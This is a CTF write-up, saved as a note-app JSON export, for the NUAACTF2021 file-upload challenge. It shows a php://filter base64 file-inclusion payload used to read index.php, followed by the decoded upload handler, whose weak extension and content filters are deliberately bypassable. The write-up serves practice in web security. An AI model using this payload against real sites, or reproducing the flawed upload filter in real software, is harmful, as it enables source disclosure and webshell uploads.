{"ID":"20241008125059-sla32ec","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241008125059-sla32ec","title":"upload-NUAACTF2021","updated":"20241008125710"},"Children":[{"ID":"20241008125059-7mtn9o1","Type":"NodeParagraph","Properties":{"id":"20241008125059-7mtn9o1","updated":"20241008125235"},"Children":[{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"https://ctf.bugku.com/challenges/detail/id/1063.html","TextMarkTextContent":"upload+文件包含+图片码+连shell"}]},{"ID":"20241008125158-uzsmxrz","Type":"NodeParagraph","Properties":{"id":"20241008125158-uzsmxrz","updated":"20241008125257"},"Children":[{"Type":"NodeText","Data":"文件上传"}]},{"ID":"20241008125304-4nazx4m","Type":"NodeParagraph","Properties":{"id":"20241008125304-4nazx4m","updated":"20241008125304"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125304-57mmicc.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125308-rvup3o8","Type":"NodeParagraph","Properties":{"id":"20241008125308-rvup3o8","updated":"20241008125408"},"Children":[{"Type":"NodeText","Data":"F12查看"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"read.php?filename="},{"Type":"NodeText","Data":"​   --\u003e考虑到结合伪协议读取源码"}]},{"ID":"20241008125325-wehrko9","Type":"NodeParagraph","Properties":{"id":"20241008125325-wehrko9","updated":"20241008125325"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125325-6bwpf91.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125420-hjyyv49","Type":"NodeParagraph","Properties":{"id":"20241008125420-hjyyv49"}},{"ID":"20241008125421-xc8evyi","Type":"NodeParagraph","Properties":{"id":"20241008125421-xc8evyi","updated":"20241008125421"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"/read.php?filename=php://filter/convert.base64-encode/resource=index.php"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125435-kdoa75m","Type":"NodeParagraph","Properties":{"id":"20241008125435-kdoa75m","updated":"20241008125435"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125435-9ean74r.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125436-zd3l07z","Type":"NodeParagraph","Properties":{"id":"20241008125436-zd3l07z","updated":"20241008125441"},"Children":[{"Type":"NodeText","Data":"base64解码"}]},{"ID":"20241008125444-ywu4j6p","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241008125444-ywu4j6p","updated":"20241008125710"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cHl0aG9u"},{"Type":"NodeCodeBlockCode","Data":"\u003cdiv class=\"light\"\u003e\u003cspan class=\"glow\"\u003e\n\t\t\t\u003cform enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"\u003e\n\t\t\t\t嘿伙计，传个火？！\n                \u003cinput class=\"input_file\" type=\"file\" name=\"upload_file\"/\u003e\n                \u003cinput class=\"button\" type=\"submit\" name=\"submit\" value=\"upload\"/\u003e\n            \u003c/form\u003e\n      \u003c/span\u003e\u003cspan class=\"flare\"\u003e\u003c/span\u003e\u003cdiv\u003e\n\t  \u003c!--read.php?filename=  --\u003e\n\u003c?php\n\terror_reporting(0);\n\t//设置上传目录\n\tdefine(\"UPLOAD_PATH\", \"./uplo4d\");    //文件上传路径\n\t$msg = \"Upload Success!\";\n\tif (isset($_POST['submit'])) {\n        $temp_file = $_FILES['upload_file']['tmp_name']; //临时存储文件名\n        $file_name = $_FILES['upload_file']['name'];     //\n        $ext = pathinfo($file_name,PATHINFO_EXTENSION);\n      if(preg_match(\"/ph/i\", strtolower($ext))){        //判断后缀名不能为ph（大小写）\n        die(\"这可不能上传啊！\");\n    }\n   \n            $content = file_get_contents($temp_file);\n            if(preg_match(\"/php/i\", $content)){\n                die(\"诶，被我发现了吧\");\n            }\n\n        $new_file_name = md5($file_name).\".\".$ext;\n        $img_path = UPLOAD_PATH . '/' . $new_file_name;\n\n\n        if (move_uploaded_file($temp_file, $img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n        }\n        echo '\u003cdiv style=\"color:#F00\"\u003e'.$msg.\" Look here~ \".$img_path.\"\u003c/div\u003e\";\n    }\n\n\n?\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}